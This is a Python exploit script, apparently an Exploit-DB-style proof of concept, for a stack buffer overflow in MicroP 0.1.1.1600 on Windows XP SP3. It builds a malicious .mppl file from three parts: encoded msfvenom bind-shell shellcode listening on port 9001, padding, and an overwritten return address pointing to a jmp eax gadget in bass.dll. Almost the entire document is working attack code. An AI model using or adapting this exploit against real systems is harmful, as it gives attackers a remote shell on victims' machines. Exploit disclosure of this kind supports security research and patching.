# Exploit Title: MicroP 0.1.1.1600 Stack Buffer Overflow
# Author: Pal1Sec
# Tested on: Windows XP, SP3
#!/usr/bin/python
file = open("exploit.mppl", "wb")

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d" -f python -v shellcode_bind

shellcode_bind =  b""
shellcode_bind += b"\xbb\x75\xa0\xa7\xf1\xda\xd3\xd9\x74\x24"
shellcode_bind += b"\xf4\x5e\x31\xc9\xb1\x53\x83\xc6\x04\x31"
shellcode_bind += b"\x5e\x0e\x03\x2b\xae\x45\x04\x2f\x46\x0b"
shellcode_bind += b"\xe7\xcf\x97\x6c\x61\x2a\xa6\xac\x15\x3f"
shellcode_bind += b"\x99\x1c\x5d\x6d\x16\xd6\x33\x85\xad\x9a"
shellcode_bind += b"\x9b\xaa\x06\x10\xfa\x85\x97\x09\x3e\x84"
shellcode_bind += b"\x1b\x50\x13\x66\x25\x9b\x66\x67\x62\xc6"
shellcode_bind += b"\x8b\x35\x3b\x8c\x3e\xa9\x48\xd8\x82\x42"
shellcode_bind += b"\x02\xcc\x82\xb7\xd3\xef\xa3\x66\x6f\xb6"
shellcode_bind += b"\x63\x89\xbc\xc2\x2d\x91\xa1\xef\xe4\x2a"
shellcode_bind += b"\x11\x9b\xf6\xfa\x6b\x64\x54\xc3\x43\x97"
shellcode_bind += b"\xa4\x04\x63\x48\xd3\x7c\x97\xf5\xe4\xbb"
shellcode_bind += b"\xe5\x21\x60\x5f\x4d\xa1\xd2\xbb\x6f\x66"
shellcode_bind += b"\x84\x48\x63\xc3\xc2\x16\x60\xd2\x07\x2d"
shellcode_bind += b"\x9c\x5f\xa6\xe1\x14\x1b\x8d\x25\x7c\xff"
shellcode_bind += b"\xac\x7c\xd8\xae\xd1\x9e\x83\x0f\x74\xd5"
shellcode_bind += b"\x2e\x5b\x05\xb4\x26\xa8\x24\x46\xb7\xa6"
shellcode_bind += b"\x3f\x35\x85\x69\x94\xd1\xa5\xe2\x32\x26"
shellcode_bind += b"\xc9\xd8\x83\xb8\x34\xe3\xf3\x91\xf2\xb7"
shellcode_bind += b"\xa3\x89\xd3\xb7\x2f\x49\xdb\x6d\xc5\x41"
shellcode_bind += b"\x7a\xde\xf8\xac\x3c\x8e\xbc\x1e\xd5\xc4"
shellcode_bind += b"\x32\x41\xc5\xe6\x98\xea\x6e\x1b\x23\x37"
shellcode_bind += b"\x46\x92\xc5\x5d\x88\xf2\x5e\xc9\x6a\x21"
shellcode_bind += b"\x57\x6e\x94\x03\xcf\x18\xdd\x45\xc8\x27"
shellcode_bind += b"\xde\x43\x7e\xbf\x55\x80\xba\xde\x69\x8d"
shellcode_bind += b"\xea\xb7\xfe\x5b\x7b\xfa\x9f\x5c\x56\x6c"
shellcode_bind += b"\x03\xce\x3d\x6c\x4a\xf3\xe9\x3b\x1b\xc5"
shellcode_bind += b"\xe3\xa9\xb1\x7c\x5a\xcf\x4b\x18\xa5\x4b"
shellcode_bind += b"\x90\xd9\x28\x52\x55\x65\x0f\x44\xa3\x66"
shellcode_bind += b"\x0b\x30\x7b\x31\xc5\xee\x3d\xeb\xa7\x58"
shellcode_bind += b"\x94\x40\x6e\x0c\x61\xab\xb1\x4a\x6e\xe6"
shellcode_bind += b"\x47\xb2\xdf\x5f\x1e\xcd\xd0\x37\x96\xb6"
shellcode_bind += b"\x0c\xa8\x59\x6d\x95\xc8\xbb\xa7\xe0\x60"
shellcode_bind += b"\x62\x22\x49\xed\x95\x99\x8e\x08\x16\x2b"
shellcode_bind += b"\x6f\xef\x06\x5e\x6a\xab\x80\xb3\x06\xa4"
shellcode_bind += b"\x64\xb3\xb5\xc5\xac"

junk1 = "\x90" * 30
junk2 = "B" * (1276-len(junk1+shellcode_bind))
eip   = "\xb5\x45\x01\x10" # 0x100145b5 jmp eax in bass.dll

buffer = junk1 + shellcode_bind + junk2 + eip

file.write(buffer)
file.close()
